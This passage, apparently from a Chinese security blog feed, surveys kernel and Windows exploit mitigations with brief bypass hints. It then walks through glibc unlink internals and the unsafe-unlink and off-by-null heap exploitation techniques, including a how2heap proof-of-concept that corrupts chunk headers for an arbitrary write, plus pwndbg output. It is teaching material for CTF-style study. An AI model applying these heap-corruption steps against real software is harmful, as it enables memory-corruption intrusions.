<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p>
<p>在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p>
<h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Prevention，管理模式访问保护。</p>
<p>如果内核态可以访问用户态的数据，也会出现问题。比如在劫持控制流后，攻击者可以通过栈迁移将栈迁移(pop rsp类似的指令)到用户态，然后进行 ROP，进一步达到提权的目的。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的。x86 下对应的保护机制的名字为 SMAP。CR4 寄存器中的第 21 位用来标记是否开启 SMEP 保护。</p>
<ul>
<li>bypass: 修改cr4</li>
</ul>
<h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Prevention，管理模式执行保护。</p>
<p>在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者<strong>控制了内核中的执行流，就可以执行处于用户态的代码</strong>。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的(ARM PXN)。x86下 <code>CR4</code> 寄存器中的第 20 位用来标记是否开启 SMEP 保护。</p>
<p>查看是否开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># 如果出现结果，说明开启</span></span><br></pre></td></tr></table></figure>

<ul>
<li>bypass: 修改cr4</li>
</ul>
<h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolation，内核页表隔离</p>
<p>在 x86_64 的 PTI 机制中，<strong>内核态的用户空间内存映射部分被全部标记为不可执行</strong>。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。</p>
<ul>
<li>bypass<ul>
<li>signal handler</li>
<li>change cr3<ul>
<li>swapgs_restore_regs_and_return_to_usermode 函数中存在可以改变 cr3 的gadget</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。目前，FGKASLR 只支持 <strong>x86_64</strong> 架构。</p>
<p>FGKASLR 利用 gcc 的编译选项 <code>-ffunction-sections</code> 把内核中不同的函数放到不同的 section 中。 在编译的过程中，任何使用 C 语言编写的函数以及不在特殊输入节的函数都会单独作为一个节；使用汇编编写的代码会位于一个统一的节中。</p>
<p>如果想要开启内核的 FGKASLR，你需要开启 <code>CONFIG_FG_KASLR=y</code> 选项。</p>
<h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p>在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护</p>
<p>在 x86 架构中，同一个 task 中使用相同的 Canary。</p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote>
<p>安卓使用 Linux Kernel，有些保护并非特有，而是是否默认开启。</p>
</blockquote>
<h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Never。内核安全特性，用来阻止内核直接执行用户空间的代码，能够极大地提升漏洞利用的难度。</p>
<p>和 smep 一个性质</p>
<h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap 类似的性质</p>
<h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity 控制流完整性</p>
<p>其核心思想是<strong>限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内</strong>。具体做法是通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。控制流劫持攻击往往会违背原有的控制流图，CFI使得这种攻击行为难以实现，从而保障软件系统的安全。</p>
<p>内核 CFI 手动启用，x86通过此开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>


<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>与 Linux 相同，ASLR 保护指的是地址随机化技术(Address Space Layout Randomization)，这项技术将在程序启动时将 DLL 随机的加载到内存中的位置，这将缓解恶意程序的加载。ASLR 自 Windows 10 开始已经在系统中被配置为默认启用。</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>这个保护类似于 Linux 中的 Canary 保护，一旦开启，会在返回地址和 BP 之前压入一个额外的 <strong>Security Cookie</strong>。系统会比较栈中的这个值和原先存放在 .data 中的值做一个比较。如果两者不吻合，说法栈中发生了溢出。</p>
<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL 混淆级保护。</p>
<h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p>
<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种 <code>Windows</code> 操作系统对错误或异常提供的处理技术。为Windows 的程序设计者提供了程序错误或异常的处理途径，使得系统更加健壮。</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>安全结构化异常处理函数，即白名单安全沙箱，事先定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li>
<li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li>
<li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity — Clang</a></li>
<li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li>
<li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwn学习</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>程序缓解机制</tag>
      </tags>
  </entry>
  <entry>
    <title>unsafe unlink</title>
    <url>/2023/09/13/unsafe%20unlink/</url>
    <content><![CDATA[<blockquote>
<p>经典漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>当一个 free chunk 从双向链表的 bins 中取出时（堆的合并），这个过程就是 unlink。</p>
<p>堆的合并主要看这一段代码，存在两种合并方式</p>
<ul>
<li>int_free 参数：p是正在free的chunk，av 指 arena(struct malloc_state)，lock避免条件竞争</li>
<li>向后合并：prev_inuse位为0，会发生unsorted bin之间合并，会检查prev_size 和 想要合并的 bin 的 size 是否相同。unlink prev_chunk</li>
<li>向前合并：不是top_chunk, unlink nextchunk。</li>
<li>至于方向：在没有翻译错误的情况下，有点绕，但是可以强行解释，因为堆往高地址生长，向前就是向高地址合并，向后就是向低地址合并？</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,就是前面的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  就是根据size进行加法，是一个宏，就是当前chunk的下一个chunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// 当前的 arena 和 next_chunk 使用指针连接</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>unlink函数主要是指针的处理，假设3个chunk，a-b-c，a-b在unsortedbin 范围，c主要防止top_chunk合并，正常情况下</p>
<ul>
<li>首先，unsorted bin 按照free时间顺序连接，fd指向时间靠前的chunk。</li>
<li>向前合并：free b, free a。先成为 arena&lt;-&gt;b 双链表，然后在调用 unlink(av, b)。</li>
<li>向后合并：free a, free b。先成为 arena&lt;-&gt;a 双链表 在int_free 调用的是 unlink(av, a)。</li>
<li>这里就使用向后合并举例：fd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arena；在经历一个赋值语句变为 arena-&gt;bk&#x3D;arena，areba-&gt;fd&#x3D;arena。从arena&lt;-&gt;a 变成了 arena 完成unlink此操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后后续继续进入free函数里操作</p>
<ul>
<li>后续操作：此时p指向a，找到arena的bins数组，然后链入arena，设置head和foot</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// 设置size罢了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// 设置下一个chunk的prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure>

<p>最后：arena的bins数组存放数据：</p>
<ul>
<li>这样涉及就好像有fd，bk指针。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>相关的攻击手段。</p>
<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>早期发现此漏洞时，没有 <code>fd-&gt;bk != p || bk-&gt;fd != p</code> 这个条件，因此直接修改 fd, bk 来进行任意地址写</p>
<ul>
<li>任意地址写，如果开了 got 表保护，可以写 hook。</li>
</ul>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>在没有 PIE 和 got表可以写时，可以通过修改got表。其本质是一个heap overflow这是比较简单的。</p>
<ul>
<li>主要是利用 unlink 中的代码，其中指针赋值简化为 <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
<li>我们控制这个 p 的内容。</li>
</ul>
<ol>
<li>按照时间 malloc A,B</li>
<li>A 堆溢出，修改A的内容 修改B的header</li>
</ol>
<ul>
<li>target &#x3D; &amp;p，需要我们可以写。或者 target就是p</li>
<li>我们在 A 里伪造一个 fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li>
<li>利用堆溢出修改 B 的header，让fake free chunk 和 B 可以合并。</li>
</ul>
<ol start="3">
<li>free B 就会 unlink，<strong>p 就是 fake free chunk</strong>，触发unlink。</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  A中伪造 =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size 过检查</span><br><span class="line">|   B     |                     |          |            prev_inuse 为0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure>


<p>how2heap 案例</p>
<ul>
<li>编译时指定no-pie</li>
<li>测试在ubuntu 22.04，可以通过assert.</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 的 header 指针</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse 为 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink 发生</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// 修改chunk0_ptr 可以修改 *(chunk0_ptr - 0x18 )的值</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较绕，但是可以直接看最后的结果，<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>。target 的内容存放着 <code>&amp;target-0x10</code> target的地址减去0x18</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr 堆地址</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>结论：target 指针指向 &amp;target-0x18。我见过的问题一般利用在全局指针数组中，通过这种方式修改got表内容。<br>改<code>arr[0]</code>，这样就可以修改和读取 <code>arr[0]</code> 。改成got表，读取内容，泄露地址，又可以修改就直接修改got表内容。<br><del>没有所有权的编程是这样的</del></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>也是堆溢出的一种形式，但还是区分一下。在这里可以攻击保护全开的程序，主要利用点为堆可以合并。</p>
<p>libc2.29 以前</p>
<ul>
<li>先释放chunk A.</li>
<li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为0.</li>
<li>再释放chunk C。</li>
</ul>
<p>libc2.29 以后有个检查，会检查prev_chunk size是否和当前的 chunk 的 prev_size 相同，而 off by null，我们无法直接改变 chunk size，因此我们在chunk里伪造一个chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure>

<p>修改后的off by null利用手段，因为没有arena的检查，只是检查了in_use位和size相关检查</p>
<ul>
<li>三个堆 A，B，C，最好是 0x438 这种不是整数类型的，会存在一段公用的结果。c防止与top_chunk合并</li>
<li>编辑A，在A中<strong>伪造一个堆</strong>，覆盖掉B的prev_inuse 位</li>
<li>free掉B，就会向后合并。</li>
<li>但是需要绕过unlink_chunk中对fd, bk检查 <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>。</li>
</ul>
<p>简单点的题目会给我们一个基地址，这里我们就可以直接像unlink一样修改fd,bk就行</p>
<ul>
<li>tcache leak 在libc 2.32 需要 <code>(fd&gt;&gt;12) ^ 0</code></li>
<li>unsorted bin 存在两个chunk，泄露其中一个的 fd,bk可以得到堆地址</li>
<li>largebin 的四个指针，只有一个chunk可以使用fd_nextsize 和 bk_nextsize指向自己</li>
</ul>
<p>在比较苛刻的条件下，我们不能泄露堆地址，但是可以通过布局heap fengshui 进行伪造fake chunk。假设程序存在off by null</p>
<ul>
<li>a-x-b-c-x-d-x, a,b,c,d 大小都在unsorted bin里，x是避免合并的chunk （c&gt;d&gt;a&#x3D;b）</li>
<li>free a, c, d 拿fd来说就是形成 d-&gt;c-&gt;a-&gt;arena 的链表。</li>
<li>free b 这时候b,c合并。变成了 b-&gt;d-&gt;a-&gt;arena 链表，但是这时候c的指针并没有清除。</li>
<li>unsorted bin FIFO。此处需要将 a，d放入largebin里，然后切割 b-c，生成e，e包含c的 fd, bk指针。</li>
<li>清空unsorted bin 获得f</li>
<li>编辑 e，可以改原来c位置的size，并且同时包含了fd, bk 指针。因此此处我们需要改一点完成unlink中的检查。</li>
<li>之前chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;d。因为其放入了largebin里 a-&gt;bk &#x3D; d， d-&gt;fd &#x3D; a，无法通过检查，因此我们需要想办法满足条件</li>
<li>将a,d从large bin 拿出来。</li>
<li>bypass bk指针：free a, free f。a-&gt;bk &#x3D; f, 将a拿出来，不会清空指针，修改一下bk指针，因为f和c距离比较近，因此我们可以通过partial write修改bk</li>
<li>bypass fd指针: 直接向bypass bk一样，bk指向的是arena。free f, free d，d-&gt;fd&#x3D;f。让后让其进入largebin里，d-&gt;fd&#x3D;f。拿回d就行<ul>
<li>这里为什么不在unsortbin里：直接拿出d，会先将f放入largebin，然后d-&gt;arena 形成链表。先拿f再拿出d, d-&gt;arena链表。都破坏了fd指针（没有指向堆。</li>
</ul>
</li>
</ul>
<p>可以使用这段代码调试，没有指针改变，主要看的是可行性。</p>
<ul>
<li>最好重新分布一下size，最简单是修改 <code>x0</code> 大小。保证f和c 只有最后一个字节不同</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// 切割 b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// 清除unsorted 